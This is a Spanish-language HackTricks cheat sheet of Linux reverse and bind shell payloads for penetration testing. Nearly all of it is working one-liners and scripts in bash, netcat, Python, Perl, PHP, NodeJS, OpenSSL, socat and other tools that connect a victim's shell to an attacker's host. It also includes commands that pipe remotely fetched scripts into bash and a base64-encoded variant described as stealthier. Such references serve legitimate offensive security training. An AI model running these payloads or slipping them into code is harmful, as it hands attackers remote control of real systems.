# Shells - Linux

{{#include ../../banners/hacktricks-training.md}}

**Si tienes preguntas sobre cualquiera de estos shells, puedes comprobarlos en** [**https://explainshell.com/**](https://explainshell.com/).<sup>[[9]](#references)</sup>

## Full TTY

**Una vez que obtengas un reverse shell**[ **lee esta página para obtener un Full TTY**](full-ttys.md)**.**

Los payloads de reverse shell de referencia recopilados a continuación también están documentados en las cheat sheets de HighOn.Coffee y PayloadsAllTheThings; verifica la disponibilidad del intérprete y de las utilidades en el objetivo antes de seleccionar uno.<sup>[[1]](#references)[[4]](#references)</sup>

## Bash | sh
```bash
curl https://reverse-shell.sh/1.1.1.1:3000 | bash
bash -i >& /dev/tcp/<ATTACKER-IP>/<PORT> 0>&1
bash -i >& /dev/udp/127.0.0.1/4242 0>&1 #UDP
0<&196;exec 196<>/dev/tcp/<ATTACKER-IP>/<PORT>; sh <&196 >&196 2>&196
exec 5<>/dev/tcp/<ATTACKER-IP>/<PORT>; while read line 0<&5; do $line 2>&5 >&5; done

#Short and bypass (credits to Dikline)
(sh)0>/dev/tcp/10.10.10.10/9091
#after getting the previous shell to get the output to execute
exec >&0
```
No olvides comprobar con otras shells: sh, ash, bsh, csh, ksh, zsh, pdksh, tcsh y bash.

### Shell segura frente a símbolos
```bash
#If you need a more stable connection do:
bash -c 'bash -i >& /dev/tcp/<ATTACKER-IP>/<PORT> 0>&1'

#Stealthier method
#B64 encode the shell like: echo "bash -c 'bash -i >& /dev/tcp/10.8.4.185/4444 0>&1'" | base64 -w0
echo bm9odXAgYmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC44LjQuMTg1LzQ0NDQgMD4mMScK | base64 -d | bash 2>/dev/null
```
#### Explicación de Shell

Los siguientes puntos resumen el comportamiento interactivo y de redirección documentado de Bash:<sup>[[10]](#references)[[11]](#references)</sup>

1. **`bash -i`**: Esta parte del comando inicia una shell Bash interactiva (`-i`).
2. **`>&`**: Esta parte del comando es una notación abreviada para **redirigir tanto la salida estándar** (`stdout`) **como el error estándar** (`stderr`) al **mismo destino**.
3. **`/dev/tcp/<ATTACKER-IP>/<PORT>`**: Este es un archivo especial que **representa una conexión TCP a la dirección IP y el puerto especificados**.
- Al **redirigir los flujos de salida y error a este archivo**, el comando envía efectivamente la salida de la sesión de shell interactiva a la máquina del atacante.
4. **`0>&1`**: Esta parte del comando **redirige la entrada estándar (`stdin`) al mismo destino que la salida estándar (`stdout`)**.

### Crear en un archivo y ejecutar
```bash
echo -e '#!/bin/bash\nbash -i >& /dev/tcp/1<ATTACKER-IP>/<PORT> 0>&1' > /tmp/sh.sh; bash /tmp/sh.sh;
wget http://<IP attacker>/shell.sh -P /tmp; chmod +x /tmp/shell.sh; /tmp/shell.sh
```
## Forward Shell

Cuando RCE está disponible, pero un reverse shell está bloqueado por un firewall, NAT o filtrado de salida, un forward shell a través del canal RCE puede proporcionar una sesión seminteractiva.<sup>[[12]](#references)</sup>

Una herramienta recomendada para este propósito es [toboggan](https://github.com/n3rada/toboggan.git), que envuelve una primitiva de ejecución de comandos en una sesión interactiva.<sup>[[12]](#references)</sup>

Para usar toboggan, crea un módulo de Python adaptado al contexto RCE de tu sistema objetivo; su interfaz de módulo espera una función `execute(command, timeout)` que devuelva la salida del comando.<sup>[[12]](#references)</sup> Por ejemplo, un módulo llamado `nix.py` podría estructurarse de la siguiente manera:
```python3
import jwt
import httpx

def execute(command: str, timeout: float = None) -> str:
# Generate JWT Token embedding the command, using space-to-${IFS} substitution for command execution
token = jwt.encode(
{"cmd": command.replace(" ", "${IFS}")}, "!rLsQaHs#*&L7%F24zEUnWZ8AeMu7^", algorithm="HS256"
)

response = httpx.get(
url="https://vulnerable.io:3200",
headers={"Authorization": f"Bearer {token}"},
timeout=timeout,
# ||BURP||
verify=False,
)

# Check if the request was successful
response.raise_for_status()

return response.text
```
Ejecuta el módulo con la sintaxis actual de línea de comandos de toboggan:<sup>[[12]](#references)</sup>
```shell
toboggan nix.py
```
Esto inicia la sesión interactiva. Para el backend integrado de Burp Suite, usa `toboggan --request burp_request.xml`; para un backend de tipo command-wrapper, usa `toboggan --exec-wrapper '<command_template>'`.<sup>[[12]](#references)</sup>

Otra posibilidad es la implementación de forward-shell de `IppSec` [**https://github.com/IppSec/forward-shell**](https://github.com/IppSec/forward-shell).<sup>[[13]](#references)</sup>

Debes modificar las siguientes partes:<sup>[[13]](#references)</sup>

- La URL del host vulnerable
- El prefijo y el sufijo de tu payload (si los hay)
- La forma en que se envía el payload (¿headers? ¿data? ¿información adicional?)

Después, puedes **enviar comandos** o usar el comando **`upgrade`** para obtener una PTY completa; la implementación consulta la salida aproximadamente cada 1,3 segundos.<sup>[[13]](#references)</sup>

## Netcat
```bash
nc -e /bin/sh <ATTACKER-IP> <PORT>
nc <ATTACKER-IP> <PORT> | /bin/sh #Blind
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ATTACKER-IP> <PORT> >/tmp/f
nc <ATTACKER-IP> <PORT1>| /bin/bash | nc <ATTACKER-IP> <PORT2>
rm -f /tmp/bkpipe;mknod /tmp/bkpipe p;/bin/sh 0</tmp/bkpipe | nc <ATTACKER-IP> <PORT> 1>/tmp/bkpipe
```
## BusyBox

BusyBox combina muchas utilidades en un único ejecutable pequeño y es común en sistemas Linux pequeños o embebidos. Si no existe un `nc` independiente, comprueba si BusyBox lo expone:<sup>[[8]](#references)[[19]](#references)</sup>
```bash
busybox --list-full | grep -E '(^|/)nc$'
busybox nc <ATTACKER-IP> <PORT> -e /bin/sh
busybox nc <ATTACKER-IP> <PORT> -e sh
```
Si existe `busybox nc`, pero la ejecución interactiva es inestable, adapta el patrón FIFO de la sección `nc` a ese applet:<sup>[[2]](#references)[[8]](#references)</sup>
```bash
rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|busybox nc <ATTACKER-IP> <PORT> >/tmp/f
```
## gsocket

Consulta las instrucciones oficiales de implementación en [https://www.gsocket.io/deploy/](https://www.gsocket.io/deploy/).<sup>[[14]](#references)</sup>
```bash
bash -c "$(curl -fsSL gsocket.io/x)"
```
## Telnet
```bash
telnet <ATTACKER-IP> <PORT> | /bin/sh #Blind
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|telnet <ATTACKER-IP> <PORT> >/tmp/f
telnet <ATTACKER-IP> <PORT> | /bin/bash | telnet <ATTACKER-IP> <PORT>
rm -f /tmp/bkpipe;mknod /tmp/bkpipe p;/bin/sh 0</tmp/bkpipe | telnet <ATTACKER-IP> <PORT> 1>/tmp/bkpipe
```
## Whois

**Atacante**
```bash
while true; do nc -l <port>; done
```
Usa la misma secuencia de entrada Enter/CTRL+D descrita en la sección Whois.<sup>[[3]](#references)</sup>

**Víctima**
```bash
export X=Connected; while true; do X=`eval $(whois -h <IP> -p <Port> "Output: $X")`; sleep 1; done
```
## Python
```bash
#Linux
export RHOST="127.0.0.1";export RPORT=12345;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
#IPv6
python -c 'import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect(("dead:beef:2::125c",4343,0,2));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=pty.spawn("/bin/sh");'
```
## Perl
```bash
perl -e 'use Socket;$i="<ATTACKER-IP>";$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"[IPADDR]:[PORT]");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
```
## Ruby
```bash
ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
ruby -rsocket -e 'exit if fork;c=TCPSocket.new("[IPADDR]","[PORT]");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
```
## PHP
```php
// Using 'exec' is the most common method, but assumes that the file descriptor will be 3.
// Using this method may lead to instances where the connection reaches out to the listener and then closes.
php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'

// Using 'proc_open' makes no assumptions about what the file descriptor will be.
// See https://security.stackexchange.com/a/198944 for more information
<?php $sock=fsockopen("10.0.0.1",1234);$proc=proc_open("/bin/sh -i",array(0=>$sock, 1=>$sock, 2=>$sock), $pipes); ?>

<?php exec("/bin/bash -c 'bash -i >/dev/tcp/10.10.14.8/4444 0>&1'"); ?>
```
## Java
```bash
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/ATTACKING-IP/80;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```
## Ncat
```bash
victim> ncat <ip> <port,eg.443> --ssl  -c  "bash -i 2>&1"
attacker> ncat -l <port,eg.443> --ssl
```
## Golang
```bash
echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","192.168.0.134:8080");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go
```
## Lua
```bash
#Linux
lua -e "require('socket');require('os');t=socket.tcp();t:connect('10.0.0.1','1234');os.execute('/bin/sh -i <&3 >&3 2>&3');"
#Windows & Linux
lua5.1 -e 'local host, port = "127.0.0.1", 4444 local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, 'r') local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()'
```
## NodeJS
```javascript
(function(){
var net = require("net"),
cp = require("child_process"),
sh = cp.spawn("/bin/sh", []);
var client = new net.Socket();
client.connect(8080, "10.17.26.64", function(){
client.pipe(sh.stdin);
sh.stdout.pipe(client);
sh.stderr.pipe(client);
});
return /a/; // Prevents the Node.js application form crashing
})();


or

require('child_process').exec('nc -e /bin/sh [IPADDR] [PORT]')
require('child_process').exec("bash -c 'bash -i >& /dev/tcp/10.10.14.2/6767 0>&1'")

or

-var x = global.process.mainModule.require
-x('child_process').exec('nc [IPADDR] [PORT] -e /bin/bash')

or

// If you get to the constructor of a function you can define and execute another function inside a string
"".sub.constructor("console.log(global.process.mainModule.constructor._load(\"child_process\").execSync(\"id\").toString())")()
"".__proto__.constructor.constructor("console.log(global.process.mainModule.constructor._load(\"child_process\").execSync(\"id\").toString())")()


or

// Abuse this syntax to get a reverse shell
var fs = this.process.binding('fs');
var fs = process.binding('fs');

or

https://gitlab.com/0x4ndr3/blog/blob/master/JSgen/JSgen.py
```
## Zsh (TCP integrado)
```bash
# Requires no external binaries; leverages zsh/net/tcp module
zsh -c 'zmodload zsh/net/tcp; ztcp <ATTACKER-IP> <PORT>; zsh -i <&$REPLY >&$REPLY 2>&$REPLY'
```
## Rustcat (rcat)

[https://github.com/robiot/rustcat](https://github.com/robiot/rustcat): listener moderno similar a netcat escrito en Rust.<sup>[[5]](#references)</sup>
```bash
# Attacker – interactive listener with history & tab-completion
rcat listen -ib 55600

# Victim – download a Linux release binary and connect back with /bin/bash
curl -L https://github.com/robiot/rustcat/releases/download/v3.0.0/rcat-v3.0.0-linux-x86_64 -o /tmp/rcat \
&& chmod +x /tmp/rcat \
&& /tmp/rcat connect -s /bin/bash <ATTACKER-IP> 55600
```
Características documentadas por el proyecto:<sup>[[5]](#references)</sup>
- Historial de comandos y autocompletado con tabulador en modo interactivo
- `-s` para seleccionar el ejecutable de shell utilizado por `connect`

## pwncat-cs

Si ya tienes **cualquier reverse shell sin procesar**, pero quieres un listener que pueda configurar una sesión más utilizable, `pwncat-cs` puede gestionar la conexión e intentar obtener una PTY remota.<sup>[[7]](#references)</sup>
```bash
# Attacker - catch a plain reverse shell and auto-upgrade it when possible
python3 -m pip install --user pwncat-cs
pwncat-cs -lp 4444

# Victim - reuse any payload from this page
bash -c 'bash -i >& /dev/tcp/<ATTACKER-IP>/4444 0>&1'
```
También admite canales `ssl-bind` y `ssl-connect` **encrypted**, por lo que puedes combinarlo con payloads `ncat --ssl` o `socat OPENSSL:` cuando necesites cifrado de transporte.<sup>[[7]](#references)</sup>

## revsh (encrypted y listo para pivoting)

`revsh` es un pequeño cliente/servidor en C que proporciona una TTY completa sobre un **túnel Diffie-Hellman encrypted** y puede conectarse opcionalmente a una interfaz **TUN/TAP** para realizar pivoting inverso similar a una VPN.<sup>[[6]](#references)</sup>
```bash
# Build after preparing the OpenSSL dependency as described in the repository README
git clone https://github.com/emptymonkey/revsh && cd revsh && make

# Attacker – controller/listener on 443
revsh -c 0.0.0.0:443

# Victim – reverse shell over the encrypted tunnel
./revsh <ATTACKER-IP>:443
```
Indicadores útiles documentados por `revsh` incluyen:<sup>[[6]](#references)</sup>
- `-b`: modo bind-shell (habilítalo en ambos extremos)
- `-D [LHOST:]LPORT` o `-B [RHOST:]RPORT`: reenvío dinámico de SOCKS 4/4a/5
- `-x`: deshabilita la configuración automática de proxies, incluida la configuración TUN/TAP predeterminada

El túnel cifrado evita exponer el tráfico del shell como texto plano, pero no elude por sí mismo la política de red.<sup>[[6]](#references)</sup>

## OpenSSL

Esta sección utiliza los comandos `req`, `s_server` y `s_client` de OpenSSL para crear un certificado y transportar un shell sobre TLS.<sup>[[15]](#references)[[16]](#references)[[17]](#references)</sup>

El atacante (Kali)
```bash
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes #Generate certificate
openssl s_server -quiet -key key.pem -cert cert.pem -port <l_port>
```
La víctima
```bash
#Linux - one-port TLS shell using a named pipe
mkfifo /tmp/.s; /bin/sh -i </tmp/.s 2>&1 | openssl s_client -quiet -connect <ATTACKER_IP>:<PORT> >/tmp/.s; rm /tmp/.s

#If the target needs SNI / hostname validation to blend with a fronted TLS service
mkfifo /tmp/.s; /bin/sh -i </tmp/.s 2>&1 | openssl s_client -quiet -servername <DOMAIN> -verify_return_error -verify_hostname <DOMAIN> -connect <ATTACKER_IP>:<PORT> >/tmp/.s; rm /tmp/.s
```
Todavía puedes usar el patrón clásico de **two-listener** cuando quieras canales de entrada/salida separados.<sup>[[16]](#references)[[17]](#references)</sup>
```bash
#Linux
openssl s_client -quiet -connect <ATTACKER_IP>:<PORT1>|/bin/bash|openssl s_client -quiet -connect <ATTACKER_IP>:<PORT2>

#Windows
openssl.exe s_client -quiet -connect <ATTACKER_IP>:<PORT1>|cmd.exe|openssl s_client -quiet -connect <ATTACKER_IP>:<PORT2>
```
## **Socat**

[https://github.com/andrew-d/static-binaries](https://github.com/andrew-d/static-binaries)

### Bind shell
```bash
victim> socat TCP-LISTEN:1337,reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane
attacker> socat FILE:`tty`,raw,echo=0 TCP:<victim_ip>:1337
```
### Reverse shell
```bash
attacker> socat TCP-LISTEN:1337,reuseaddr FILE:`tty`,raw,echo=0
victim> socat TCP4:<attackers_ip>:1337 EXEC:bash,pty,stderr,setsid,sigint,sane
```
## Awk
```bash
awk 'BEGIN {s = "/inet/tcp/0/<IP>/<PORT>"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
```
## Finger

**Atacante**
```bash
while true; do nc -l 79; done
```
Para enviar el comando, escríbelo, presiona Intro y presiona CTRL+D (para detener STDIN).<sup>[[3]](#references)</sup>

**Víctima**
```bash
export X=Connected; while true; do X=`eval $(finger "$X"@<IP> 2> /dev/null')`; sleep 1; done

export X=Connected; while true; do X=`eval $(finger "$X"@<IP> 2> /dev/null | grep '!'|sed 's/^!//')`; sleep 1; done
```
## Gawk
```bash
#!/usr/bin/gawk -f

BEGIN {
Port    =       8080
Prompt  =       "bkd> "

Service = "/inet/tcp/" Port "/0/0"
while (1) {
do {
printf Prompt |& Service
Service |& getline cmd
if (cmd) {
while ((cmd |& getline) > 0)
print $0 |& Service
close(cmd)
}
} while (cmd != "exit")
close(Service)
}
}
```
## Xterm

Esto intentará conectarse a tu sistema en el puerto 6001.<sup>[[2]](#references)</sup>
```bash
xterm -display 10.0.0.1:1
```
Para capturar el reverse shell, usa un X server escuchando en el puerto 6001, como se muestra a continuación.<sup>[[2]](#references)</sup>
```bash
# Authorize host
xhost +targetip
# Listen
Xnest :1
```
## Groovy

por [frohoff](https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76). NOTA: Java reverse shell también funciona para Groovy.<sup>[[18]](#references)</sup>
```bash
String host="localhost";
int port=8044;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```
## References

- [1] [Hoja de trucos de Reverse Shell: PHP, ASP, Netcat, Bash y Python](https://highon.coffee/blog/reverse-shell-cheat-sheet/)
- [2] [Hoja de trucos de Reverse Shell](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
- [3] [Uso de Whois y Finger para Reverse Shells](https://tcm1911.github.io/posts/whois-and-finger-reverse-shell/)
- [4] [PayloadsAllTheThings - Hoja de trucos de Reverse Shell](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
- [5] [rustcat - El listener de puertos moderno y Reverse Shell](https://github.com/robiot/rustcat)
- [6] [revsh - Un Reverse Shell con soporte de terminal, tunelización de datos y capacidades avanzadas de pivoting](https://github.com/emptymonkey/revsh)
- [7] [pwncat (pwncat-cs) - plataforma de post-explotación](https://github.com/calebstewart/pwncat)
- [8] [busybox | GTFOBins](https://gtfobins.org/gtfobins/busybox/)
- [9] [explainshell.com](https://explainshell.com/)
- [10] [Manual de referencia de Bash: Redirecciones](https://www.gnu.org/s/bash/manual/html_node/Redirections.html)
- [11] [Manual de referencia de Bash: Invocación de Bash](https://www.gnu.org/software/bash/manual/html_node/Invoking-Bash.html)
- [12] [toboggan](https://github.com/n3rada/toboggan)
- [13] [forward-shell](https://github.com/IppSec/forward-shell)
- [14] [Instrucciones de implementación de Global Socket](https://www.gsocket.io/deploy/)
- [15] [openssl-req](https://docs.openssl.org/4.0/man1/openssl-req/)
- [16] [openssl-s_server](https://docs.openssl.org/master/man1/openssl-s_server/)
- [17] [openssl-s_client](https://docs.openssl.org/master/man1/openssl-s_client/)
- [18] [Reverse Shell puro de Groovy/Java](https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76)
- [19] [BusyBox](https://busybox.net/about.html)
{{#include ../../banners/hacktricks-training.md}}
